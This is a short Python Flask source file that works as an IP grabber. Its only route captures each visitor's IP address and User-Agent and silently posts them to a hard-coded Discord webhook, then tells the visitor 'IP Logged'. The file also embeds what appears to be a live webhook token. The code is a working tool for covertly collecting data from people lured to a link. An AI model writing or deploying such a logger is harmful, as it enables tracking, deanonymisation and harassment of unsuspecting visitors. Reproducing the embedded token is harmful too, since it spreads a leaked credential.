from flask import Flask, request
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1385037922855682068/kgfhnHmxIVDLG-LNFej8liMtrrbyju6JqmrpI8ddaOoG8vzE0aoOa1aOQ716SUhBCswq"

@app.route("/")
def grab_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    embed = {
        "title": "uhh",
        "color": 0x3498db,
        "fields": [
            {"name": "IP Address", "value": ip, "inline": False},
            {"name": "User Agent", "value": user_agent or "Unknown", "inline": False}
        ]
    }

    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    return "IP Logged ✅"